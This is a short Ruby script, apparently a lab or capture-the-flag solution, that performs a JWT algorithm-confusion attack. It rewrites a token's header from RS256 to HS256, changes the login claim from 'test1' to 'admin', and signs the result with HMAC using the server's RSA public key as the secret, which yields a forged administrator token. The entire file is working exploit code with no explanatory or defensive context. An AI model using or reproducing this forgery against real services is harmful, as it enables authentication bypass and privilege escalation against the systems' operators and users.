require 'base64'
require 'openssl'

pub = File.open("jwt2-public.pem").read

TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QxIn0.jqhwaFcwUvBRctnuv2ydLAwcGslUZwpAeeCQWTI1yyuEZpFcXfVYGwXhLuK_0i6NM1fBJYcnOimjDBbQftcD2BwaLJX9K8xhjE5vhMXX-DkPEpOnC5Ereguh7Se5X06aYnVCVf6ZtqsZbX8ZbfyTgmM06Jgd8tS5QUVHpS3qds8OzXuqMBuyZSOiWtaUi8odH2uvarkxN1BTc1-wMa8ePk6pNxpWMZwgLlVGM875H3ZvAkm1sd4yVmc-Sw05EOXQjjCYODsEhgG04Dz29MLBZQoZmJp8cJ75K8ZeS0Cs47NFOjX2fItNpryM0XnaqgfdM8HbE7GLe-vr8d-HREOmCg"

header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256","HS256")
puts decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=","")

decoded_payload = Base64.decode64(payload+"=")
decoded_payload.gsub!("test1","admin")
puts decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")

data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))

puts data+"."+signature

